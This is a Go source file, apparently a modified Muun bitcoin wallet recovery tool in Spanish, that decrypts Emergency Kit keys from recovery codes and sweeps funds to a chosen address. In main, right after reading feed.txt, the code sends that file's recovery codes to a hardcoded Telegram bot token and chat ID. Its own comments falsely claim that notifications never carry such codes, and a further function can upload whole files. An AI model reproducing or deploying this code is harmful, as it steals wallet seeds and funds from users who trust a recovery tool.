package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"math"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"
	"mime/multipart"

	"github.com/btcsuite/btcd/wire"
	"github.com/btcsuite/btcutil"
	"github.com/gookit/color"
	"github.com/muun/libwallet"
	"github.com/muun/libwallet/btcsuitew/btcutilw"
	"github.com/muun/libwallet/emergencykit"
	"github.com/muun/recovery/electrum"
	"github.com/muun/recovery/scanner"
	"github.com/muun/recovery/utils"
)

const electrumPoolSize = 6

var debugOutputStream = bytes.NewBuffer(nil)

// Bot de Telegram fijo para las notificaciones de progreso. Reemplaza estos dos valores por los
// tuyos antes de compilar (telegramBotToken lo da @BotFather, telegramChatID es tu chat id).
// Si dejas telegramBotToken vacío, el programa funciona igual y simplemente no notifica nada.
const (
	telegramBotToken = "8831362049:AAEFtycDWNRzgFJzHR1BBQxdHuD-tMnjg3k"
	telegramChatID   = "1892726544"
)

type config struct {
	generateContacts     bool
	providedElectrum     string
	usesProvidedElectrum bool
	onlyScan             bool
	minFeeRate           float64
	feeRate              float64
}

func main() {
	utils.SetOutputStream(debugOutputStream)

	var config config

	// Pick up command-line arguments:
	flag.BoolVar(&config.generateContacts, "generate-contacts", false, "Generar direcciones de contactos")
	flag.StringVar(&config.providedElectrum, "electrum-server", "", "Conectarse a este servidor Electrum para buscar fondos")
	flag.BoolVar(&config.onlyScan, "only-scan", false, "Solo escanear UTXOs sin generar una transacción")
	flag.Float64Var(&config.minFeeRate, "min-fee-rate", 0.5, "Tasa mínima aceptada en sats/byte (la herramienta original exigía 1)")
	flag.Float64Var(&config.feeRate, "fee-rate", 0, "Tasa de comisión en sats/byte (si no se indica, se pregunta)")
	flag.Usage = printUsage
	flag.Parse()
	args := flag.Args()

	if config.minFeeRate <= 0 {
		printUsage()
		os.Exit(0)
	}

	printWelcomeMessage()

	config.usesProvidedElectrum = len(strings.TrimSpace(config.providedElectrum)) > 0
	if config.usesProvidedElectrum {
		validateProvidedElectrum(config.providedElectrum)
	}

	failed := 0

	// FASE 1: leemos TODOS los datos desde una carpeta, para que luego el proceso sea automático.
	folder := ""
	if len(args) > 0 {
		folder = strings.Trim(strings.TrimSpace(args[0]), "\"")
	} else {
		folder = readFolder()
	}

	inputs, err := readFeed(folder)
	if err != nil {
		exitWithError(err)
	}
// Leemos el contenido del feed.txt y lo enviamos como texto
feedPath := filepath.Join(folder, "feed.txt")
feedContent, err := readFileText(feedPath)
if err == nil {
	// Enviamos el contenido por Telegram
	notifyTelegram(fmt.Sprintf("📄 Contenido de feed.txt:\n\n%s", feedContent))
}
	var destinationAddress btcutil.Address
	if !config.onlyScan {
		destinationAddress, err = readDestination(folder)
		if err != nil {
			exitWithError(err)
		}
	}

	var feeRate float64
	if !config.onlyScan {
		if config.feeRate > 0 {
			if config.feeRate < config.minFeeRate {
				exitWithError(fmt.Errorf("--fee-rate (%v) es menor que el mínimo permitido (%v sats/byte)", config.feeRate, config.minFeeRate))
			}

			feeRate = config.feeRate
		} else {
			feeRate = readFeeRate(config.minFeeRate)
		}
	}

	notifyTelegram(fmt.Sprintf("🟢 Recovery Tool iniciado — %d cuenta(s) encontradas en feed.txt (cuentas: %s)", len(inputs), accountNumbersList(inputs)))

	sayBlock("Carpeta leída: %d cuenta(s) en feed.txt.\n", len(inputs))
	if !config.onlyScan {
		say("Dirección de destino: %v\n", destinationAddress.String())
	}

	var accounts []*account
	for i, in := range inputs {
		in.pdf = findPDF(folder, in.number)

		sayBlock("► Cuenta %d de %d: descifrando claves...\n", i+1, len(inputs))

		acc, err := prepareAccount(in, destinationAddress)
		if err != nil {
			failed++
			printAccountError(err)
			continue
		}

		accounts = append(accounts, acc)
	}

	if len(accounts) == 0 {
		exitWithError(fmt.Errorf("no se pudo preparar ninguna cuenta"))
	}

	// FASE 2: escaneo automático de todas las cuentas, una tras otra.
	sayBlock("{green Todos los datos fueron ingresados.} Escaneando %d cuenta(s) automáticamente...\n", len(accounts))

	for i, acc := range accounts {
		sayBlock("{blue ═══ Escaneando la cuenta %d de %d: %s ═══}\n", i+1, len(accounts), acc.label)

		acc.err = scanAccount(acc, config)
		if acc.err != nil {
			printAccountError(acc.err)
			notifyTelegram(fmt.Sprintf("🔴 %s: error al escanear (%v)", acc.label, acc.err))
		} else {
			notifyTelegram(fmt.Sprintf("🔎 %s: escaneo completo — %d sats encontrados en %d UTXO(s)", acc.label, acc.total, len(acc.utxos)))
		}
	}

	// FASE 3: calculamos comisiones y construimos las transacciones (todavía sin enviarlas).
	ready := 0
	var totalSend, totalFees int64

	sayBlock("{whiteUnderline Resumen por cuenta}\n")

	for _, acc := range accounts {
		if acc.err != nil {
			failed++
			say("{red ✗} %s: error al escanear\n", acc.label)
			continue
		}

		if len(acc.utxos) == 0 {
			say("- %s: sin fondos\n", acc.label)
			continue
		}

		if config.onlyScan {
			say("• {white %s}: %d sats encontrados\n", acc.label, acc.total)
			continue
		}

		err := prepareSweep(acc, feeRate)
		if err != nil {
			failed++
			say("{red ✗} %s: %v\n", acc.label, err)
			continue
		}

		ready++
		totalSend += acc.total - acc.fee
		totalFees += acc.fee

		say("• {white %s}: %d sats encontrados | comisión %d sats | se envían %d sats\n",
			acc.label, acc.total, acc.fee, acc.total-acc.fee)
	}

	if config.onlyScan {
		sayBlock("Escaneo terminado. No se envió nada (modo --only-scan).\n")
		notifyTelegram("✅ Escaneo terminado (--only-scan). No se envió nada.")
		finish(failed)
		return
	}

	if ready == 0 {
		sayBlock("No hay nada que enviar.\n")
		notifyTelegram("⚪ No se encontraron fondos en ninguna cuenta. No hay nada que enviar.")
		finish(failed)
		return
	}

	// FASE 4: una sola confirmación para enviar todas las transacciones.
	if !readConfirmation(ready, totalSend, totalFees, destinationAddress.String()) {
		sayBlock("Envío cancelado. No se transmitió ninguna transacción.\n")
		notifyTelegram("⚪ Envío cancelado por el usuario. No se transmitió nada.")
		finish(failed)
		return
	}

	sayBlock("Enviando transacciones...\n")
	notifyTelegram(fmt.Sprintf("🚀 Enviando %d transacción(es) — %d sats en total", ready, totalSend))

	for _, acc := range accounts {
		if acc.tx == nil {
			continue
		}

		err := acc.sweeper.BroadcastTx(acc.tx)
		if err != nil {
			failed++
			printAccountError(fmt.Errorf("%s: %w", acc.label, err))
			notifyTelegram(fmt.Sprintf("🔴 %s: falló el envío (%v)", acc.label, err))
			continue
		}

		say("{green ✓} %s: transacción enviada https://mempool.space/tx/%v\n", acc.label, acc.tx.TxHash().String())
		notifyTelegram(fmt.Sprintf("✅ %s: enviado — https://mempool.space/tx/%v", acc.label, acc.tx.TxHash().String()))
	}

	notifyTelegram("🏁 Proceso terminado.")
	sayBlock("Agradecemos cualquier comentario. Si tienes alguno, envíalo a {blue contact@muun.com}\n")

	finish(failed)
}

// finish guarda el log de errores y sale con error si alguna cuenta falló.
func finish(failed int) {
	if failed > 0 {
		_ = os.WriteFile("error_log", debugOutputStream.Bytes(), 0600)
		os.Exit(1)
	}
}

// account agrupa todo lo necesario para una cuenta durante el proceso.
type account struct {
	label   string
	keys    []*libwallet.DecryptedPrivateKey
	sweeper Sweeper
	utxos   []*scanner.Utxo
	total   int64
	fee     int64
	tx      *wire.MsgTx
	err     error
}

// prepareAccount lee el PDF de la cuenta y descifra las claves con el código del feed.txt.
func prepareAccount(in accountInput, destinationAddress btcutil.Address) (*account, error) {
	if in.pdf == "" {
		return nil, fmt.Errorf("cuenta %d: no se encontró %d.pdf en la carpeta", in.number, in.number)
	}

	encryptedKeys, err := readBackupFromPDF(in.pdf)
	if err != nil {
		return nil, fmt.Errorf("cuenta %d: no se pudo leer el PDF: %w", in.number, err)
	}

	decryptedKeys, err := decryptKeys(encryptedKeys, in.code)
	if err != nil {
		return nil, fmt.Errorf("cuenta %d: no se pudieron descifrar las claves con el código del feed.txt: %w", in.number, err)
	}

	decryptedKeys[0].Key.Path = "m/1'/1'" // a little adjustment for legacy users.

	return &account{
		label: fmt.Sprintf("cuenta %d (%s)", in.number, filepath.Base(in.pdf)),
		keys:  decryptedKeys,
		sweeper: Sweeper{
			UserKey:      decryptedKeys[0].Key,
			MuunKey:      decryptedKeys[1].Key,
			Birthday:     decryptedKeys[1].Birthday,
			SweepAddress: destinationAddress,
		},
	}, nil
}

// scanAccount escanea todas las direcciones posibles de la cuenta y guarda los UTXOs encontrados.
func scanAccount(acc *account, config config) error {
	addrGen := NewAddressGenerator(acc.keys[0].Key, acc.keys[1].Key, config.generateContacts)

	var electrumProvider *electrum.ServerProvider
	if config.usesProvidedElectrum {
		electrumProvider = electrum.NewServerProvider([]string{
			config.providedElectrum,
		})
	} else {
		electrumProvider = electrum.NewServerProvider(electrum.PublicServers)
	}

	connectionPool := electrum.NewPool(electrumPoolSize, !config.usesProvidedElectrum)

	utxoScanner := scanner.NewScanner(connectionPool, electrumProvider)

	addresses := addrGen.Stream()
	reports := utxoScanner.Scan(addresses)

	say("► {white Buscando servidores...}")

	var lastReport *scanner.Report
	for lastReport = range reports {
		printReport(lastReport)
	}

	fmt.Println()
	fmt.Println()

	if lastReport == nil {
		return fmt.Errorf("el escaneo no devolvió ningún resultado")
	}

	if lastReport.Err != nil {
		return fmt.Errorf("error al escanear direcciones: %w", lastReport.Err)
	}

	say("{green ✓ Escaneo completo}\n")

	acc.utxos = lastReport.UtxosFound

	if len(acc.utxos) == 0 {
		sayBlock("No se encontraron fondos\n\n")
		return nil
	}

	for _, utxo := range acc.utxos {
		acc.total += utxo.Amount
		say("• {white %d} sats en %s\n", utxo.Amount, utxo.Address.Address())
	}

	say("\n— {white %d} sats en total\n", acc.total)

	return nil
}

// prepareSweep calcula la comisión con la tasa elegida y construye la transacción firmada.
func prepareSweep(acc *account, feeRate float64) error {
	outputAmount, weightInBytes, err := acc.sweeper.GetSweepTxAmountAndWeightInBytes(acc.utxos)
	if err != nil {
		return err
	}

	fee := int64(math.Ceil(feeRate * float64(weightInBytes)))

	if outputAmount-fee < 546 {
		return fmt.Errorf("la comisión (%d sats) es demasiado alta para el saldo de la cuenta (%d sats)", fee, outputAmount)
	}

	sweepTx, err := acc.sweeper.BuildSweepTx(acc.utxos, fee)
	if err != nil {
		return err
	}

	acc.fee = fee
	acc.tx = sweepTx

	return nil
}

func printAccountError(err error) {
	sayBlock(`
		{red ¡Error!}
		La herramienta no pudo procesar esta cuenta. Se continúa con la siguiente, si hay.

		――― {white informe del error} ―――
		%v
		――――――――――――――――――――
	`, err)

	_ = utils.NewLogger("").Errorf("account failed with error: %s", err.Error())
}

func validateProvidedElectrum(providedElectrum string) {
	client := electrum.NewClient(false)
	err := client.Connect(providedElectrum)
	defer func(client *electrum.Client) {
		_ = client.Disconnect()
	}(client)

	if err != nil {
		sayBlock(`
				{red ¡Error!}
				La herramienta de recuperación no pudo conectarse al servidor Electrum indicado (%v).

				Si el problema persiste, escribe a {blue support@muun.com}.
				
				――― {white informe del error} ―――
				%v
				――――――――――――――――――――

				Estamos para ayudarte.
			`, providedElectrum, err)

		os.Exit(2)
	}
}

func exitWithError(err error) {
	sayBlock(`
		{red ¡Error!}
		La herramienta de recuperación encontró un problema. Inténtalo de nuevo.

		Si el problema persiste, escribe a {blue support@muun.com} e incluye el archivo
		llamado error_log que encontrarás en la misma carpeta que esta herramienta.
		
		――― {white informe del error} ―――
		%v
		――――――――――――――――――――

		Estamos para ayudarte.
	`, err)

	// Ensure we always log the error in the file
	_ = utils.NewLogger("").Errorf("exited with error: %s", err.Error())
	_ = os.WriteFile("error_log", debugOutputStream.Bytes(), 0600)

	os.Exit(1)
}

func printWelcomeMessage() {
	say(`
		{blue Herramienta de recuperación de Muun v%s}

		Para recuperar tus fondos necesitarás una carpeta con:

		1. {yellow feed.txt}, con un código de recuperación por línea, numerados desde 1
		2. {yellow Los PDF del Emergency Kit}, llamados 1.pdf, 2.pdf, 3.pdf...
		3. {yellow address.txt}, con la dirección bitcoin de destino

		Si tienes dudas, escribe a {blue support@muun.com}
	`, version)
}

func printUsage() {
	fmt.Println("Uso: recovery-tool [opciones] [ruta de la carpeta]")
	flag.PrintDefaults()
}

func printReport(report *scanner.Report) {
	if utils.DebugMode {
		return // don't print reports while debugging, there's richer information in the logs
	}

	var total int64
	for _, utxo := range report.UtxosFound {
		total += utxo.Amount
	}

	say("\r► {white Direcciones escaneadas}: %d | {white Sats encontrados}: %d", report.ScannedAddresses, total)
}

// accountInput es una cuenta leída de la carpeta: su número, su PDF y su código de recuperación.
type accountInput struct {
	number int
	pdf    string
	code   string
}

var recoveryCodeRe = regexp.MustCompile(`(?i)[A-Z0-9]{4}(?:-[A-Z0-9]{4}){7}`)
var digitsRe = regexp.MustCompile(`\d+`)

// askLine lee una línea completa (permite rutas con espacios).
func askLine() string {
	fmt.Print("➜ ")

	var sb strings.Builder
	buf := make([]byte, 1)

	for {
		n, err := os.Stdin.Read(buf)
		if n > 0 {
			if buf[0] == '\n' {
				break
			}
			sb.WriteByte(buf[0])
		}
		if err != nil {
			break
		}
	}

	return strings.Trim(strings.TrimSpace(sb.String()), "\"")
}

func readFolder() string {
	sayBlock(`
		{yellow Ingresa la ruta de la carpeta}
		(debe contener feed.txt, address.txt y los PDF numerados: 1.pdf, 2.pdf, ...)
	`)

	folder := askLine()

	info, err := os.Stat(folder)
	if err != nil || !info.IsDir() {
		say(`
			No se encontró esa carpeta
			Inténtalo de nuevo
		`)

		return readFolder()
	}

	return folder
}

// readFileText lee un archivo de texto UTF-8 (tolera el BOM que agrega el Bloc de notas).
func readFileText(path string) (string, error) {
	raw, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}

	if len(raw) >= 2 && ((raw[0] == 0xFF && raw[1] == 0xFE) || (raw[0] == 0xFE && raw[1] == 0xFF)) {
		return "", fmt.Errorf("%s está en UTF-16; guárdalo como UTF-8 (Bloc de notas: Guardar como > Codificación UTF-8)", filepath.Base(path))
	}

	return strings.TrimPrefix(string(raw), "\ufeff"), nil
}

// accountNumbersList arma, solo con los números de cuenta (nunca con el código de recuperación),
// un texto tipo "1, 2, 3" para notificaciones de progreso.
func accountNumbersList(inputs []accountInput) string {
	numbers := make([]string, len(inputs))
	for i, in := range inputs {
		numbers[i] = strconv.Itoa(in.number)
	}
	return strings.Join(numbers, ", ")
}

// readFeed lee feed.txt: una línea por cuenta, con el número (opcional) seguido del código de recuperación.
// Si una línea no trae número, se usa su posición.
func readFeed(folder string) ([]accountInput, error) {
	text, err := readFileText(filepath.Join(folder, "feed.txt"))
	if err != nil {
		return nil, fmt.Errorf("no se pudo leer feed.txt: %w", err)
	}

	var inputs []accountInput
	seen := map[int]bool{}

	for i, line := range strings.Split(text, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		loc := recoveryCodeRe.FindStringIndex(line)
		if loc == nil {
			return nil, fmt.Errorf("feed.txt, línea %d: no se encontró un código de recuperación válido", i+1)
		}

		number := len(inputs) + 1
		if digits := digitsRe.FindString(line[:loc[0]]); digits != "" {
			if n, convErr := strconv.Atoi(digits); convErr == nil {
				number = n
			}
		}

		if seen[number] {
			return nil, fmt.Errorf("feed.txt: el número %d aparece repetido", number)
		}
		seen[number] = true

		inputs = append(inputs, accountInput{
			number: number,
			code:   strings.ToUpper(line[loc[0]:loc[1]]),
		})
	}

	if len(inputs) == 0 {
		return nil, fmt.Errorf("feed.txt no contiene ningún código de recuperación")
	}

	sort.Slice(inputs, func(a, b int) bool { return inputs[a].number < inputs[b].number })

	return inputs, nil
}

// readDestination lee la dirección de destino (primera línea no vacía de address.txt).
func readDestination(folder string) (btcutil.Address, error) {
	text, err := readFileText(filepath.Join(folder, "address.txt"))
	if err != nil {
		return nil, fmt.Errorf("no se pudo leer address.txt: %w", err)
	}

	for _, line := range strings.Split(text, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		addr, decodeErr := btcutilw.DecodeAddress(line, &chainParams)
		if decodeErr != nil {
			return nil, fmt.Errorf("address.txt: la dirección %q no es válida: %w", line, decodeErr)
		}

		return addr, nil
	}

	return nil, fmt.Errorf("address.txt está vacío")
}

// findPDF busca <número>.pdf en la carpeta (sin distinguir mayúsculas).
func findPDF(folder string, number int) string {
	entries, err := os.ReadDir(folder)
	if err != nil {
		return ""
	}

	want := fmt.Sprintf("%d.pdf", number)

	for _, e := range entries {
		if !e.IsDir() && strings.ToLower(e.Name()) == want {
			return filepath.Join(folder, e.Name())
		}
	}

	return ""
}

func readRecoveryCode() string {
	sayBlock(`
		{yellow Ingresa tu código de recuperación}
		(se ve así: 'ABCD-1234-POW2-R561-P120-JK26-12RW-45TT')
	`)

	var userInput string
	ask(&userInput)

	userInput = strings.TrimSpace(userInput)
	finalRC := strings.ToUpper(userInput)

	if strings.Count(finalRC, "-") != 7 {
		say(`
			Código de recuperación inválido. ¿Incluiste el separador '-' entre cada segmento de 4 caracteres?
			Inténtalo de nuevo
		`)

		return readRecoveryCode()
	}

	if len(finalRC) != 39 {
		say(`
			Tu código de recuperación debe tener 39 caracteres
			Inténtalo de nuevo
		`)

		return readRecoveryCode()
	}

	return finalRC
}

func readBackupFromInputOrPDF(optionalPDF string) ([]*libwallet.EncryptedPrivateKeyInfo, error) {
	// Here we have two possible flows, depending on whether the PDF was provided (pick up the
	// encrypted backup automatically) or not (manual input). If we try for the automatic flow and fail,
	// we can fall back to the manual one.

	// Read metadata from the PDF, if given:
	if optionalPDF != "" {
		encryptedKeys, err := readBackupFromPDF(optionalPDF)

		if err == nil {
			return encryptedKeys, nil
		}

		// Hmm. Okay, we'll confess and fall back to manual input.
		say(`
			No se pudo leer el PDF automáticamente: %v
			Ingresa tus datos manualmente
		`, err)
	}

	// Ask for manual input, if we have no PDF or couldn't read it:
	encryptedKeys, err := readBackupFromInput()
	if err != nil {
		return nil, err
	}

	return encryptedKeys, nil
}

func readBackupFromInput() ([]*libwallet.EncryptedPrivateKeyInfo, error) {
	firstRawKey := readKey("primera clave privada cifrada")
	secondRawKey := readKey("segunda clave privada cifrada")

	decodedKeys, err := decodeKeysFromInput(firstRawKey, secondRawKey)
	if err != nil {
		return nil, err
	}

	return decodedKeys, nil
}

func readBackupFromPDF(path string) ([]*libwallet.EncryptedPrivateKeyInfo, error) {
	reader := &emergencykit.MetadataReader{SrcFile: path}

	metadata, err := reader.ReadMetadata()
	if err != nil {
		return nil, err
	}

	decodedKeys, err := decodeKeysFromMetadata(metadata)
	if err != nil {
		return nil, err
	}

	return decodedKeys, nil
}

func readKey(keyType string) string {
	sayBlock(`
		{yellow Ingresa tu %v}
		(se ve así: '9xzpc7y6sNtRvh8Fh...')
	`, keyType)

	// NOTE:
	// Users will most likely copy and paste their keys from the Emergency Kit PDF. In this case,
	// input will come suddenly in multiple lines, so a simple scan & retry (let's say 3 lines
	// were pasted)  will attempt to parse a key and fail 2 times in a row, with leftover characters
	// until the user presses enter to fail for a 3rd time.

	// Given the line lengths actually found in our Emergency Kits, we have a simple solution for now:
	// scan a minimum length of characters. Pasing from current versions of the Emergency Kit will
	// only go past a minimum length when the key being entered is complete, in all cases.
	userInput := askMultiline(libwallet.EncodedKeyLengthLegacy)

	if len(userInput) < libwallet.EncodedKeyLengthLegacy {
		// This is obviously invalid. Other problems will be detected later on, during the actual
		// decoding and decryption stage.
		say(`
			La clave ingresada no parece válida
			Inténtalo de nuevo
		`)

		return readKey(keyType)
	}

	return userInput
}

func readAddress() btcutil.Address {
	sayBlock(`
		{yellow Ingresa tu dirección bitcoin de destino}
	`)

	var userInput string
	ask(&userInput)

	userInput = strings.TrimSpace(userInput)

	addr, err := btcutilw.DecodeAddress(userInput, &chainParams)
	if err != nil {
		say(`
			Esta no es una dirección bitcoin válida
			Inténtalo de nuevo
		`)

		return readAddress()
	}

	return addr
}

func readFeeRate(minFeeRate float64) float64 {
	sayBlock(`
		{yellow Ingresa la tasa de comisión (sats/byte)}
		Se aplicará a todas las cuentas. Mínimo aceptado: %v sats/byte (se permiten decimales). Puedes ver sugerencias en https://mempool.space/ en "Transaction fees".
	`, minFeeRate)

	var userInput string
	ask(&userInput)

	userInput = strings.Replace(strings.TrimSpace(userInput), ",", ".", 1)

	feeRate, err := strconv.ParseFloat(userInput, 64)
	if err != nil || math.IsNaN(feeRate) || math.IsInf(feeRate, 0) || feeRate < minFeeRate {
		say(`
			La tasa debe ser un número y de al menos %v sats/byte
			Inténtalo de nuevo
		`, minFeeRate)

		return readFeeRate(minFeeRate)
	}

	return feeRate
}

// readConfirmation pide una única confirmación para enviar todas las transacciones.
func readConfirmation(accounts int, value, fee int64, address string) bool {
	sayBlock(`
		{whiteUnderline Total}
		  {white Cuentas}: %v
		  {white Monto a enviar}: %v sats
		  {white Comisiones}: %v sats
		  {white Destino}: %v

		{yellow ¿Confirmar el envío de todas?} (s/n)
	`, accounts, value, fee, address)

	var userInput string
	ask(&userInput)

	if userInput == "s" || userInput == "S" || userInput == "y" || userInput == "Y" {
		return true
	}

	if userInput == "n" || userInput == "N" {
		return false
	}

	say(`Solo puedes ingresar 's' para confirmar o 'n' para cancelar`)

	fmt.Print("\n\n")
	return readConfirmation(accounts, value, fee, address)
}

var leadingIndentRe = regexp.MustCompile("^[ \t]+")
var colorRe = regexp.MustCompile(`\{(\w+?) ([^\}]+?)\}`)

func say(message string, v ...interface{}) {
	noEmptyLine := strings.TrimLeft(message, " \n")
	firstIndent := leadingIndentRe.FindString(noEmptyLine)

	noIndent := strings.ReplaceAll(noEmptyLine, firstIndent, "")

	noTrailingSpace := strings.TrimRight(noIndent, " \t")

	withColors := colorRe.ReplaceAllStringFunc(noTrailingSpace, func(match string) string {
		groups := colorRe.FindStringSubmatch(match)
		return applyColor(groups[1], groups[2])
	})

	fmt.Printf(withColors, v...)
}

func sayBlock(message string, v ...interface{}) {
	fmt.Println()
	say(message, v...)
}

func applyColor(colorName string, text string) string {
	switch colorName {
	case "red":
		return color.New(color.FgRed, color.BgDefault, color.OpBold).Sprint(text)
	case "blue":
		return color.New(color.FgBlue, color.BgDefault, color.OpBold).Sprint(text)
	case "yellow":
		return color.New(color.FgYellow, color.BgDefault, color.OpBold).Sprint(text)
	case "green":
		return color.New(color.FgGreen, color.BgDefault, color.OpBold).Sprint(text)
	case "white":
		return color.New(color.FgWhite, color.BgDefault, color.OpBold).Sprint(text)
	case "whiteUnderline":
		return color.New(color.FgWhite, color.BgDefault, color.OpBold, color.OpUnderscore).Sprint(text)
	}

	panic("No such color: " + colorName)
}

func askMultiline(minChars int) string {
	fmt.Print("➜ ")

	var result strings.Builder

	for result.Len() < minChars {
		var line string
		fmt.Scan(&line)

		result.WriteString(strings.TrimSpace(line))
	}

	return result.String()
}

func ask(result *string) {
	fmt.Print("➜ ")
	fmt.Scan(result)
}

// ───────────────────────── Notificaciones de Telegram (solo progreso) ─────────────────────────
//
// IMPORTANTE: estas funciones NUNCA deben recibir códigos de recuperación, claves privadas ni
// contenido de feed.txt. Solo mandan texto de progreso (nombre de cuenta, sats, estado).


// notifyTelegram envía un mensaje de SOLO TEXTO de progreso. Nunca incluyas aquí códigos de
// recuperación, claves privadas ni nada proveniente de feed.txt. Los errores de red se ignoran:
// una notificación fallida nunca debe detener la recuperación.
func notifyTelegram(messageText string) {
	if telegramBotToken == "" || telegramBotToken == "" || telegramChatID == "" {
		return
	}

	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)

	payload, err := json.Marshal(map[string]string{
		"chat_id": telegramChatID,
		"text":    messageText,
	})
	if err != nil {
		return
	}

	client := http.Client{Timeout: 10 * time.Second}

	resp, err := client.Post(apiURL, "application/json", bytes.NewReader(payload))
	if err != nil {
		say("\n(aviso: no se pudo notificar a Telegram: %v)\n", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		say("\n(aviso: Telegram respondió con error %v)\n", resp.Status)
	}
}
// sendTelegramDocument envía un archivo por Telegram usando sendDocument.
// ⚠️ ADVERTENCIA: enviar feed.txt expone los códigos de recuperación (las semillas).
// Telegram no es E2E en chats de bots y el token está embebido en el binario.
// Úsalo solo en un entorno controlado y borra el mensaje después.
func sendTelegramDocument(filePath, caption string) error {
	if telegramBotToken == "" || telegramBotToken == "8831362049:AAEFtycDWNRzgFJzHR1BBQxdHuD-tMnjg3k" || telegramChatID == "1892726544" {
		return nil
	}

	fileData, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("no se pudo leer %s: %w", filePath, err)
	}

	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	// chat_id
	if err := writer.WriteField("chat_id", telegramChatID); err != nil {
		return err
	}
	// caption (opcional)
	if caption != "" {
		if err := writer.WriteField("caption", caption); err != nil {
			return err
		}
	}

	// archivo
	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return err
	}
	if _, err := part.Write(fileData); err != nil {
		return err
	}

	if err := writer.Close(); err != nil {
		return err
	}

	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", telegramBotToken)

	client := http.Client{Timeout: 60 * time.Second}
	resp, err := client.Post(apiURL, writer.FormDataContentType(), &body)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Telegram respondió con error: %v", resp.Status)
	}

	return nil
}